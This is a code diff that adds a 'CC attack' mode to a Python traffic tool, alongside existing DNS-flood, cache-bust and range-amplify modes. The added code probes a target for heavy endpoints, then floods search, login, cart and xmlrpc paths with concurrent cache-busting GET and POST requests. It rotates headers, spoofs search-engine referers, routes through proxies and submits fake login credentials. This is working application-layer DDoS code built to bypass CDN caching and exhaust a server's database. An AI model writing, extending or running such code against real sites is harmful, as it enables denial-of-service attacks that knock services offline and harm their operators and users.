@@ -553,6 +553,161 @@ class TrafficWorker:
                 self._result.add_latency(elapsed_ms)
                 self._result.error_breakdown[type(e).__name__] = self._result.error_breakdown.get(type(e).__name__, 0) + 1
 
+    # ── CC Attack (Challenge Collapsar) ───────────────────────────────────
+    # Simulates real users requesting computationally heavy pages (search,
+    # login, cart, paginated listings) that bypass CDN cache and force
+    # full server-side processing with DB queries.
+
+    # Common heavy-endpoint patterns ordered by likelihood
+    _CC_PATHS = [
+        "/?s={q}&page={p}",
+        "/search?q={q}&page={p}",
+        "/search?keyword={q}&p={p}",
+        "/search/?query={q}&offset={p}",
+        "/?search={q}&lang={l}",
+        "/api/search?q={q}&page={p}",
+        "/api/v1/search?term={q}&offset={p}",
+        "/wp-json/wp/v2/posts?search={q}&page={p}",
+        "/login?redirect=/{q}",
+        "/user/login?next=/{q}",
+        "/cart?add={p}&qty={p}",
+        "/product?id={p}&ref={q}",
+        "/catalog?category={q}&page={p}&sort=price",
+        "/news?tag={q}&page={p}",
+        "/forum?board={p}&start={p}",
+        "/wp-admin/admin-ajax.php",
+        "/xmlrpc.php",
+    ]
+
+    _CC_KEYWORDS = [
+        "iphone", "laptop", "shoes", "hotel", "flight", "visa", "crypto",
+        "bitcoin", "game", "movie", "music", "news", "sport", "car",
+        "doctor", "lawyer", "insurance", "bank", "loan", "deal",
+        "sale", "discount", "offer", "buy", "cheap", "best", "top",
+        "2024", "2025", "review", "price", "compare", "download",
+    ]
+
+    _CC_POST_TARGETS = [
+        ("/search", {"q": "{q}", "page": "{p}"}),
+        ("/wp-login.php", {"log": "admin", "pwd": "{q}", "wp-submit": "Log+In"}),
+        ("/login", {"username": "user{p}", "password": "{q}", "remember": "on"}),
+        ("/api/search", {"query": "{q}", "page": "{p}", "per_page": "20"}),
+        ("/comment/reply", {"post_id": "{p}", "content": "{q}", "author": "user{p}"}),
+    ]
+
+    async def _cc_discover_endpoints(self, session: aiohttp.ClientSession) -> list[str]:
+        """Probe the target once to discover which heavy paths exist."""
+        parsed = urlparse(self.profile.target_url)
+        base = f"{parsed.scheme}://{parsed.netloc}"
+        alive: list[str] = []
+        probes = [
+            "/search", "/?s=test", "/api/search", "/catalog", "/news",
+        ]
+        for path in probes:
+            try:
+                async with session.get(
+                    base + path,
+                    headers=get_random_headers(),
+                    timeout=aiohttp.ClientTimeout(total=5),
+                    ssl=False,
+                    allow_redirects=True,
+                ) as resp:
+                    if resp.status < 400:
+                        alive.append(base + path)
+            except Exception:
+                pass
+        # Always include the base URL itself as a fallback
+        alive.append(self.profile.target_url)
+        return alive
+
+    def _cc_build_url(self, base_url: str) -> str:
+        """Build a unique, cache-busting URL pointing to a heavy endpoint."""
+        parsed = urlparse(base_url)
+        base = f"{parsed.scheme}://{parsed.netloc}"
+        template = random.choice(self._CC_PATHS)
+        q = random.choice(self._CC_KEYWORDS) + str(random.randint(10, 9999))
+        p = str(random.randint(1, 500))
+        l = random.choice(["en", "ru", "de", "fr", "es"])
+        path = template.format(q=q, p=p, l=l)
+        return base + path
+
+    def _cc_build_post(self, base_url: str) -> tuple[str, dict]:
+        """Return (url, post_data) for a POST-based CC request."""
+        parsed = urlparse(base_url)
+        base = f"{parsed.scheme}://{parsed.netloc}"
+        path_tpl, data_tpl = random.choice(self._CC_POST_TARGETS)
+        q = random.choice(self._CC_KEYWORDS) + str(random.randint(1, 999))
+        p = str(random.randint(1, 999))
+        data = {k: v.format(q=q, p=p) for k, v in data_tpl.items()}
+        return base + path_tpl, data
+
+    async def _cc_request(self, session: aiohttp.ClientSession,
+                          proxy: str | None = None,
+                          endpoints: list[str] | None = None):
+        t0 = time.monotonic()
+        use_post = random.random() < 0.3  # 30% POST (login/search forms)
+        try:
+            headers = get_random_headers()
+            headers.update({
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                "Accept-Language": random.choice(["en-US,en;q=0.9", "ru-RU,ru;q=0.9", "de-DE,de;q=0.9"]),
+                "Referer": random.choice([
+                    self.profile.target_url,
+                    "https://google.com/search?q=" + random.choice(self._CC_KEYWORDS),
+                    "https://yandex.ru/search/?text=" + random.choice(self._CC_KEYWORDS),
+                ]),
+                "Cache-Control": "no-cache",
+                "Pragma": "no-cache",
+            })
+            kwargs: dict = dict(
+                headers=headers,
+                timeout=aiohttp.ClientTimeout(total=self.profile.timeout),
+                ssl=False,
+                allow_redirects=True,
+            )
+            if proxy:
+                kwargs["proxy"] = proxy
+
+            if use_post:
+                url, post_data = self._cc_build_post(self.profile.target_url)
+                kwargs["data"] = post_data
+                async with session.post(url, **kwargs) as resp:
+                    await resp.read()
+                    elapsed_ms = (time.monotonic() - t0) * 1000
+                    async with self._lock:
+                        self._result.total_requests += 1
+                        if resp.status < 500:
+                            self._result.success += 1
+                        else:
+                            self._result.failed += 1
+                        self._result.add_latency(elapsed_ms)
+                        self._result.status_codes[str(resp.status)] = \
+                            self._result.status_codes.get(str(resp.status), 0) + 1
+            else:
+                base = random.choice(endpoints) if endpoints else self.profile.target_url
+                url = self._cc_build_url(base)
+                async with session.get(url, **kwargs) as resp:
+                    await resp.read()
+                    elapsed_ms = (time.monotonic() - t0) * 1000
+                    async with self._lock:
+                        self._result.total_requests += 1
+                        if resp.status < 500:
+                            self._result.success += 1
+                        else:
+                            self._result.failed += 1
+                        self._result.add_latency(elapsed_ms)
+                        self._result.status_codes[str(resp.status)] = \
+                            self._result.status_codes.get(str(resp.status), 0) + 1
+
+        except Exception as e:
+            elapsed_ms = (time.monotonic() - t0) * 1000
+            async with self._lock:
+                self._result.total_requests += 1
+                self._result.failed += 1
+                self._result.add_latency(elapsed_ms)
+                self._result.error_breakdown[type(e).__name__] = \
+                    self._result.error_breakdown.get(type(e).__name__, 0) + 1
+
     # ── DNS flood ──────────────────────────────────────────────────────────
     # Floods DNS resolver with unique random subdomain queries
 
@@ -686,6 +841,16 @@ class TrafficWorker:
 
         pending: set[asyncio.Task] = set()
 
+        # Pre-discover heavy endpoints for CC attack
+        cc_endpoints: list[str] = []
+        if method_type == "cc":
+            try:
+                cc_endpoints = await self._cc_discover_endpoints(_get_session())
+                logger.info("CC: discovered %d heavy endpoints", len(cc_endpoints))
+            except Exception as e:
+                logger.warning("CC endpoint discovery failed: %s", e)
+                cc_endpoints = [self.profile.target_url]
+
         try:
             while time.monotonic() - start < p.duration:
                 if self._stop_event.is_set():
@@ -738,6 +903,16 @@ class TrafficWorker:
                         pending.add(t)
                         t.add_done_callback(pending.discard)
                     await asyncio.sleep(0.1)
+
+                elif method_type == "cc":
+                    slots = p.concurrency - active
+                    for _ in range(min(slots, 60)):
+                        t = asyncio.create_task(
+                            self._cc_request(sess, proxy, cc_endpoints or [self.profile.target_url])
+                        )
+                        pending.add(t)
+                        t.add_done_callback(pending.discard)
+                    await asyncio.sleep(0.01)
 
                 elif method_type == "mixed":
                     # 40% cache-bust + 30% range-amplify + 30% regular flood
